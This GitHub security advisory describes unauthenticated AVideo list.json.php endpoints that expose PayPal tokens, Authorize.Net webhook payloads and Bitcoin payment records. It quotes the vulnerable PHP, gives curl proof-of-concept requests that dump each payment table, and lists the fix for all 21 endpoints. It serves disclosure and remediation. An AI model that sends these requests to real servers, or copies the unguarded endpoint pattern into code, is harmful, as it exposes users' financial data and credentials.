# [H] AVideo: Unauthenticated Access to Payment Log DataTables Endpoints Exposes Transaction Data, PayPal Tokens, and User Financial Records

## Summary
Severity: High
Advisory: GHSA-wprj-9cvc-5w37
CWE: CWE-200, CWE-862
Ecosystem: Packagist
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N (CVSS_V3)
Published: 2026-03-29
Source: https://github.com/advisories/GHSA-wprj-9cvc-5w37
Type: github-advisory

## Affected
- Packagist: `wwbn/avideo` — affected >=0

## Details
## Summary

Multiple payment plugin `list.json.php` endpoints lack authentication and authorization checks, allowing unauthenticated attackers to retrieve all payment transaction records including PayPal billing agreement IDs, Express Checkout tokens, Authorize.Net webhook payloads with transaction details, and Bitcoin payment records. This is the same class of vulnerability fixed in the Scheduler plugin (GHSA-j724-5c6c-68g5 / commit 83390ab1f) but the fix was not applied to the remaining 21 affected endpoints.

## Details

The AVideo ObjectYPT admin CRUD pattern generates four endpoints per database table: `add.json.php`, `delete.json.php`, `list.json.php`, and an `index.php` page. In the payment plugins, `add.json.php` and `delete.json.php` correctly check `User::isAdmin()` before proceeding, but the `list.json.php` endpoints have no authorization check whatsoever.

**PayPalYPT_log list endpoint** (`plugin/PayPalYPT/View/PayPalYPT_log/list.json.php:1-10`):
```php
<?php
require_once '../../../../videos/configuration.php';
require_once $global['systemRootPath'] . 'plugin/PayPalYPT/Objects/PayPalYPT_log.php';
header('Content-Type: application/json');

$rows = PayPalYPT_log::getAll();
$total = PayPalYPT_log::getTotal();
?>
{"data": <?php echo json_encode($rows); ?>, ...}
```

No `User::isAdmin()` check. The `getAll()` method (inherited from `ObjectYPT`) executes `SELECT * FROM PayPalYPT_log` returning all records.

**Contrast with the sibling add endpoint** (`plugin/PayPalYPT/View/PayPalYPT_log/add.json.php:13-16`):
```php
if (!User::isAdmin()) {
    $obj->msg = "You can't do this";
    die(json_encode($obj));
}
```

The `configuration.php` bootstrap file performs no global authentication gating — it initializes the application framework but does not enforce auth. No `.htaccess` rules restrict access to plugin View directories.

**Data model** (`plugin/PayPalYPT/Objects/PayPalYPT_log.php`): Each record contains `agreement_id`, `users_id`, `json` (full PayPal API response), `recurring_payment_id`, `value` (payment amount), and `token` (PayPal Express Checkout token).

The identical pattern exists in:
- `plugin/AuthorizeNet/View/Anet_webhook_log/list.json.php` — full Authorize.Net webhook payloads
- `plugin/BTCPayments/View/Btc_payments/list.json.php` — Bitcoin transaction identifiers and amounts

This was the exact same vulnerability class patched in commit 83390ab1f for the Scheduler plugin (GHSA-j724-5c6c-68g5), but the fix was only applied to the 3 Scheduler endpoints. A total of 21 `list.json.php` endpoints across the codebase remain unprotected.

## PoC

**Step 1 — Dump PayPal transaction logs (unauthenticated):**
```bash
curl -s 'https://target.com/plugin/PayPalYPT/View/PayPalYPT_log/list.json.php'
```
Returns all PayPal transaction records including agreement IDs, tokens, payment amounts, user IDs, and full PayPal API JSON responses.

**Step 2 — Dump Authorize.Net webhook logs (unauthenticated):**
```bash
curl -s 'https://target.com/plugin/AuthorizeNet/View/Anet_webhook_log/list.json.php'
```
Returns all Authorize.Net webhook payloads including transaction IDs, event types, and payment details.

**Step 3 — Dump Bitcoin payment records (unauthenticated):**
```bash
curl -s 'https://target.com/plugin/BTCPayments/View/Btc_payments/list.json.php'
```
Returns all Bitcoin transaction identifiers, BTC amounts, and store identifiers.

**Step 4 — Confirm sibling endpoints ARE protected:**
```bash
curl -s -X POST 'https://target.com/plugin/PayPalYPT/View/PayPalYPT_log/add.json.php'
# Returns: {"error":true,"msg":"You can't do this"}
```

## Impact

- **Financial data exposure:** Unauthenticated attackers can retrieve all payment transaction records across PayPal, Authorize.Net, and Bitcoin payment providers.
- **Token leakage:** PayPal Express Checkout tokens and billing agreement IDs are exposed, potentially enabling payment manipulation or account correlation.
- **PII leakage:** Transaction records contain user ID mappings, payment amounts, and full API responses that may include payer email addresses and names.
- **Broad scope:** 21 total `list.json.php` endpoints lack auth, also exposing live streaming server infrastructure (`Live_servers`), user connection data, meeting participation logs, and AI transcription responses.
- **Zero interaction required:** No authentication, no user interaction — a single GET request dumps the entire table.

## Recommended Fix

Add `User::isAdmin()` checks to all unprotected `list.json.php` endpoints, matching the pattern used in the Scheduler fix (commit 83390ab1f). For each affected file, add immediately after the `require_once` and `header()` lines:

```php
if (!User::isAdmin()) {
    $obj = new stdClass();
    $obj->error = true;
    $obj->msg = "You can't do this";
    die(json_encode($obj));
}
```

The full list of files requiring this fix:

1. `plugin/PayPalYPT/View/PayPalYPT_log/list.json.php`
2. `plugin/AuthorizeNet/View/Anet_webhook_log/list.json.php`
3. `plugin/BTCPayments/View/Btc_payments/list.json.php`
4. `plugin/AI/View/Ai_responses/list.json.php`
5. `plugin/AI/View/Ai_metatags_responses/list.json.php`
6. `plugin/AI/View/Ai_transcribe_responses/list.json.php`
7. `plugin/Live/view/Live_servers/list.json.php`
8. `plugin/Live/view/Live_schedule/list.json.php`
9. `plugin/Live/view/Live_restreams_logs/list.json.php`
10. `plugin/SocialMediaPublisher/View/Publisher_schedule/list.json.php`
11. `plugin/SocialMediaPublisher/View/Publisher_social_medias/list.json.php`
12. `plugin/Meet/View/Meet_join_log/list.json.php`
13. `plugin/Meet/View/Meet_schedule_has_users_groups/list.json.php`
14. `plugin/PlayLists/View/Playlists_schedules/list.json.php`
15. `plugin/UserConnections/View/Users_connections/list.json.php`
16. `plugin/UserNotifications/View/User_notifications/list.json.php`
17. `plugin/VideosStatistics/View/Statistics/list.json.php`
18. `plugin/VideoTags/View/Tags_subscriptions/list.json.php`
19. `plugin/CustomizeUser/View/Categories_has_users_groups/list.json.php`
20. `plugin/CustomizeUser/View/Users_extra_info/list.json.php`
21. `plugin/ImageGallery/list.json.php`

## References
- https://github.com/WWBN/AVideo/security/advisories/GHSA-wprj-9cvc-5w37
- https://github.com/WWBN/AVideo/commit/1729a955f8de7e26552eb728b3d1e6f4b1b9352e
- https://github.com/WWBN/AVideo
- https://github.com/advisories/GHSA-j724-5c6c-68g5
